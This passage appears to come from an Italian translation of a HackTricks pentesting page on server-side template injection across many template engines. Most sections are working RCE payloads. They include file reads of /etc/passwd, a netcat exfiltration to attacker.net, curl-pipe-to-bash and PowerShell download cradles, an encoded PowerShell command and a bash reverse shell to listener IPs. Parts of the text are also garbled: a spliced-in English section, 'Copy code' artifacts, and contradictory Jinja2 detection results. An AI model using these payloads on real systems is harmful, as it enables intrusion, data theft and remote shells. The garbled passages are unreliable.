Inoltre, Twig offre una serie di funzioni di sicurezza per proteggere i template da attacchi di iniezione di codice dannoso. Ad esempio, Twig impedisce l'esecuzione di codice PHP all'interno dei template e offre meccanismi per filtrare e sanificare i dati inseriti nel template.

In conclusione, Twig √® un potente motore di template che semplifica la creazione e la gestione dei template PHP. Offre una sintassi intuitiva, funzionalit√† avanzate e meccanismi di sicurezza per garantire che i template siano robusti e sicuri.
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**Ulteriori informazioni**

* Nella sezione Twig e Twig (Sandboxed) di [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

### Plates (PHP)

Plates √® un motore di template nativo di PHP, che trae ispirazione da Twig. Tuttavia, a differenza di Twig, che introduce una nuova sintassi, Plates utilizza il codice PHP nativo nei template, rendendolo intuitivo per gli sviluppatori PHP.

Controller:
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
Modello di pagina:
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
Modello di layout:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Titolo del sito</title>
</head>
<body>
    <header>
        <h1>Intestazione del sito</h1>
    </header>
    <nav>
        <ul>
            <li><a href="/">Home</a></li>
            <li><a href="/about">Chi siamo</a></li>
            <li><a href="/contact">Contatti</a></li>
        </ul>
    </nav>
    <main>
        <!-- Contenuto dinamico verr√† inserito qui -->
    </main>
    <footer>
        <p>¬© 2021 Nome del sito. Tutti i diritti riservati.</p>
    </footer>
</body>
</html>
```

Il modello di layout definisce la struttura di base di un sito web. Include un'intestazione con il titolo del sito, una barra di navigazione con collegamenti alle pagine principali, un'area principale per il contenuto dinamico e un pi√® di pagina con l'anno corrente e il nome del sito.
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
**Ulteriori informazioni**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates)

### PHPlib e HTML\_Template\_PHPLIB (PHP)

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB) √® la stessa cosa di PHPlib ma portata su Pear.

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
# Server-Side Template Injection (SSTI)

## Authors

This page displays a list of authors. The authors' names are retrieved from a database and rendered on the page using a server-side template.

## Vulnerability

The `authors.php` file is vulnerable to Server-Side Template Injection (SSTI). This vulnerability allows an attacker to inject malicious code into the server-side template, which is then executed on the server.

## Exploitation

To exploit this vulnerability, an attacker can inject template code that allows them to execute arbitrary commands on the server. This can be done by injecting code into the template that is executed when the page is rendered.

## Example

For example, if the server-side template uses the Twig template engine, an attacker can inject code like `{{ system('ls') }}` to execute the `ls` command on the server and retrieve a list of files.

## Prevention

To prevent Server-Side Template Injection, it is important to properly sanitize and validate user input before using it in server-side templates. Additionally, using a template engine that automatically escapes user input can help mitigate this vulnerability.

## References

- [OWASP Server-Side Template Injection](https://owasp.org/www-community/attacks/Server-Side_Template_Injection)
- [Twig Template Engine](https://twig.symfony.com/)
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
**Ulteriori informazioni**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib)

### Jade (NodeJS)
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**Ulteriori informazioni**

* Nella sezione Jade di [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template) √® un motore di template PHP non compilante che utilizza tag XML per dividere un documento in diverse parti.
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
**Ulteriori informazioni**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate)

### Handlebars (NodeJS)

Path Traversal (ulteriori informazioni [qui](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)).
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= Errore
* ${7\*7} = ${7\*7}
* Nulla
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```
**Ulteriori informazioni**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **Template** | **Descrizione**                         |
| ------------ | --------------------------------------- |
|              | Valuta e renderizza l'output            |
|              | Valuta e renderizza l'output codificato in HTML |
|              | Commento                                |
| e            | Consenti codice (disabilitato per impostazione predefinita) |

* \= 49

**Lato client**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**Server Side**

Il **Server Side** (lato server) si riferisce a tutte le operazioni che vengono eseguite sul server, piuttosto che sul client (lato client). Questo include l'esecuzione di codice, la gestione dei dati e la generazione di pagine web dinamiche. Nel contesto delle vulnerabilit√† di sicurezza, il **Server Side** pu√≤ essere un punto di attacco per i criminali informatici.

Le vulnerabilit√† di **Server Side** possono consentire agli attaccanti di eseguire codice malevolo sul server, ottenere accesso non autorizzato ai dati sensibili o compromettere l'integrit√† del sistema. Una delle vulnerabilit√† comuni nel contesto del **Server Side** √® l'**Injection**, che consente agli attaccanti di inserire codice dannoso all'interno di un'applicazione web.

Una delle forme di **Injection** che pu√≤ verificarsi sul lato server √® l'**Server Side Template Injection (SSTI)**. Questa vulnerabilit√† si verifica quando un'applicazione web utilizza template engine per generare pagine dinamiche e non valida correttamente i dati di input. Gli attaccanti possono sfruttare questa vulnerabilit√† per iniettare codice malevolo all'interno dei template, che verr√† poi eseguito dal server.

L'**SSTI** pu√≤ essere sfruttato per eseguire comandi arbitrari sul server, ottenere informazioni sensibili o persino compromettere l'intero sistema. Gli attaccanti possono utilizzare tecniche come l'iniezione di comandi o l'iniezione di oggetti per sfruttare questa vulnerabilit√†.

Per proteggere le applicazioni web dalle vulnerabilit√† di **Server Side**, √® importante implementare correttamente la validazione dei dati di input, utilizzare template engine sicuri e limitare i privilegi del server. Inoltre, √® consigliabile effettuare regolarmente test di sicurezza, come il **pentesting**, per identificare e correggere eventuali vulnerabilit√† presenti.
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**Ulteriori informazioni**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**Esempio di rendering lato server**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**Ulteriori informazioni**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = Nessuna uscita
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = Errore
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**Ulteriori informazioni**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (Ruby)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = Errore`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**Ulteriori informazioni**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (Ruby)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**Ulteriori informazioni**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

Consulta la seguente pagina per imparare trucchi su **esecuzione di comandi arbitrari eludendo le sandbox** in python:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = Errore`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}



{{os.system('whoami')}}
{{os.system('whoami')}}
```
**Ulteriori informazioni**
* [https://ajinabraham.com/blog/server-side-template-injection-in-tornado](https://ajinabraham.com/blog/server-side-template-injection-in-tornado)

### Jinja2 (Python)

[Sito web ufficiale](http://jinja.pocoo.org)

> Jinja2 √® un motore di template completo per Python. Supporta pienamente Unicode, un ambiente di esecuzione sandbox opzionale, ampiamente utilizzato e con licenza BSD.

* `{{7*7}} = Errore`
* `${7*7} = ${7*7}`
* `{{foobar}} Niente`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}



{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - Formato del template**

Jinja2 √® un motore di template per Python che consente di creare template HTML dinamici. I template Jinja2 sono costituiti da blocchi di codice Python all'interno di tag speciali. Questi tag vengono interpretati e compilati dal motore di template per generare l'output desiderato.

**Sintassi dei tag Jinja2**

I tag Jinja2 sono racchiusi tra parentesi graffe doppie `{{ }}` o tra parentesi percentuali `{% %}`. I tag tra parentesi graffe doppie vengono utilizzati per eseguire espressioni e visualizzare il risultato, mentre i tag tra parentesi percentuali vengono utilizzati per eseguire istruzioni di controllo come cicli e condizioni.

**Iniezione di template lato server (SSTI)**

L'iniezione di template lato server (SSTI) √® una vulnerabilit√† che si verifica quando un'applicazione web accetta input non attendibile e lo utilizza per generare template dinamici senza una corretta sanitizzazione. Questo pu√≤ consentire a un attaccante di eseguire codice arbitrario sul server.

**Rilevazione delle SSTI**

Per rilevare le SSTI, √® possibile inserire un payload di SSTI valido all'interno di un campo di input e osservare se viene interpretato come codice. Ad esempio, √® possibile utilizzare il payload `{{7*'7'}}` per verificare se viene visualizzato il risultato `49`.

**Esempio di SSTI in Jinja2**

Di seguito √® riportato un esempio di SSTI in Jinja2:

```python
from jinja2 import Template

template_string = """
<html>
<body>
<h1>Benvenuto, {{ name }}!</h1>
</body>
</html>
"""

template = Template(template_string)
output = template.render(name=request.args.get('name'))
```

In questo esempio, il parametro `name` viene utilizzato direttamente nel template senza alcuna sanitizzazione. Un attaccante potrebbe sfruttare questa vulnerabilit√† inserendo un payload di SSTI nel parametro `name` per eseguire codice arbitrario sul server.

**Prevenzione delle SSTI**

Per prevenire le SSTI, √® importante validare e sanificare tutti gli input dell'utente prima di utilizzarli per generare template dinamici. √à possibile utilizzare librerie di sanitizzazione come `bleach` o `html.escape` per evitare l'esecuzione di codice indesiderato.

Inoltre, √® consigliabile limitare i privilegi dell'account utilizzato per eseguire il codice del template, in modo che anche se un attaccante riesce a eseguire codice arbitrario, il danno sia limitato.

**Conclusioni**

L'iniezione di template lato server (SSTI) √® una vulnerabilit√† critica che pu√≤ consentire a un attaccante di eseguire codice arbitrario sul server. √à importante prendere precauzioni per prevenire le SSTI, come la validazione e la sanitizzazione degli input dell'utente e la limitazione dei privilegi dell'account del template.
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**RCE non dipendente da**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) `__builtins__`:
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**Ulteriori dettagli su come sfruttare Jinja**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

Altri payload su [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
**Ulteriori informazioni**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako)

### Razor (.Net)

* `@(2+2) <= Successo`
* `@() <= Successo`
* `@("{{code}}") <= Successo`
* `@ <= Successo`
* `@{} <= ERRORE!`
* `@{ <= ERRORE!`
* `@(1+2)`
* `@( //C#Code )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwMAXABQAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");`

Il metodo `.NET` `System.Diagnostics.Process.Start` pu√≤ essere utilizzato per avviare qualsiasi processo sul server e quindi creare una webshell. Puoi trovare un esempio di webapp vulnerabile su [https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)

**Ulteriori informazioni**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = Nulla
* `<%= response.write(date()) %>` = \<Data>
```xml
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**Ulteriori informazioni**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojolicious (Perl)

Anche se √® in Perl, utilizza tag come ERB in Ruby.

* `<%= 7*7 %> = 49`
* `<%= foobar %> = Errore`
```
<%= perl code %>
<% perl code %>
```
### SSTI in GO

Nel motore di template di Go, la conferma del suo utilizzo pu√≤ essere fatta con payload specifici:

* `{{ . }}`: Rivela l'input della struttura dei dati. Ad esempio, se viene passato un oggetto con un attributo `Password`, `{{ .Password }}` potrebbe esporla.
* `{{printf "%s" "ssti" }}`: Dovrebbe visualizzare la stringa "ssti".
* `{{html "ssti"}}`, `{{js "ssti"}}`: Questi payload dovrebbero restituire "ssti" senza aggiungere "html" o "js". Ulteriori direttive possono essere esplorate nella documentazione di Go [qui](https://golang.org/pkg/text/template).

**Sfruttamento XSS**

Con il pacchetto `text/template`, l'XSS pu√≤ essere semplice inserendo direttamente il payload. Al contrario, il pacchetto `html/template` codifica la risposta per prevenirlo (ad esempio, `{{"<script>alert(1)</script>"}}` viene visualizzato come `&lt;script&gt;alert(1)&lt;/script&gt;`). Tuttavia, la definizione e l'invocazione del template in Go possono aggirare questa codifica:
{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}

vbnet
Copy code

**Sfruttamento RCE**

Lo sfruttamento della RCE differisce significativamente tra `html/template` e `text/template`. Il modulo `text/template` consente di chiamare direttamente qualsiasi funzione pubblica (usando il valore "call"), cosa non consentita in `html/template`. La documentazione per questi moduli √® disponibile [qui per html/template](https://golang.org/pkg/html/template/) e [qui per text/template](https://golang.org/pkg/text/template/).

Per la RCE tramite SSTI in Go, √® possibile invocare i metodi degli oggetti. Ad esempio, se l'oggetto fornito ha un metodo `System` che esegue comandi, pu√≤ essere sfruttato come `{{ .System "ls" }}`. Di solito √® necessario accedere al codice sorgente per sfruttare questo, come nell'esempio fornito:
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**Ulteriori informazioni**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### Altri Exploit

Controlla il resto di [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) per altri exploit. Puoi trovare anche informazioni interessanti sui tag in [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## Aiuto correlato

Se pensi che possa essere utile, leggi:

* [Trucchi Flask](../../network-services-pentesting/pentesting-web/flask.md)
* [Funzioni magiche di Python](broken-reference/)

## Strumenti

* [https://github.com/Hackmanit/TInjA](https://github.com/Hackmanit/TInjA)
* [https://github.com/vladko312/sstimap](https://github.com/vladko312/sstimap)
* [https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)
* [https://github.com/Hackmanit/template-injection-table](https://github.com/Hackmanit/template-injection-table)

## Lista di rilevamento Brute-Force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## Pratica e riferimenti

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [https://portswigger.net/web-security/server-side-template-injection](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) √® l'evento sulla sicurezza informatica pi√π rilevante in **Spagna** e uno dei pi√π importanti in **Europa**. Con **la missione di promuovere la conoscenza tecnica**, questo congresso √® un punto di incontro bollente per i professionisti della tecnologia e della sicurezza informatica in ogni disciplina.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
